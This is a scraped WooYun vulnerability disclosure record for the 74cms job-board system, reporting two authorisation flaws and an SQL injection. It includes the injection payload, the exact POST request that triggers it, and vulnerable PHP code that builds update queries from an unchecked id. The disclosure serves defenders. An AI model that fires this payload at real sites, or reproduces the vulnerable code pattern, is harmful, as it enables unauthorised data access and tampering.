{"id": 47595, "wybug_id": "wooyun-2014-080154", "wybug_title": "骑士人才系统 2处越权+1处sql注入获取敏感信息", "wybug_corp": "74c,s.com", "wybug_author": "menmen519", "wybug_date": "2014-10-21 17:27", "wybug_open_date": "2015-01-19 17:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-25：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-19：\t细节向公众公开  简要描述： 骑士人才系统 2处越权+1处sql注入获取敏感信息 详细说明：  这里我就不做代码分析了，直接看我操作第一步，我们首先注册一个正常的企业用户第二步，我们修改企业用户的信息\n\n公司名称',`jobs_name`=user() #-- sdd然后我们访问url：POST /74cms_v3.5.1_20141015/upload/wap/company/wap_company_jobs.php?act=jobs_edit_save HTTP/1.1Host: localhostpostdata:id=1&add_mode=1&days=0&jobs_name=xxxxx&nature=62&nature_cn=xxxx&topclass=1&category=4&subclass=569&category_cn=xxxxx&amount=111&district=4&sdistrict=93&district_cn=xxxxx&wage=58&wage_cn=2000~3000xxxx&sex=1&sex_cn=%E7%94%B7&education=69&education_cn=xxxx&experience=75&experience_cn=xxxx&graduate=0&contents=xxxxxxxxxxxxxx&contact=xxxxxxxxxxxxxx&telephone=029-88164598查看发布的职位信息:\n\n下来我们看越权处:第一处:没有参与uid计算wap_company_jobs.php:\n// 暂停 职位 elseif($act==\"jobs_pause\"){\t//越权\t$smarty->cache = false;\t$id=$_POST['id'];\t$sql=\"update \".table(\"jobs\").\" set display=2 where id=$id\";\t$db->query($sql)?exit(\"ok\"):exit(\"err\");}\n第二处：\nelseif($act==\"jobs_regain\"){\t$smarty->cache = false;\t$id=$_POST['id'];\t//越权\t$sql=\"update \".table(\"jobs\").\" set display=1 where id=$id\";\t$db->query($sql)?exit(\"ok\"):exit(\"err\");}\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-10-22 10:55 厂商回复： 感谢反馈！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-21 17:49 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  咋这么多嘞    \n     2015-01-19 19:19 |    \t\t李宇航的小柠檬 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 小柠檬甜不甜)\t\t \n  看不懂    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}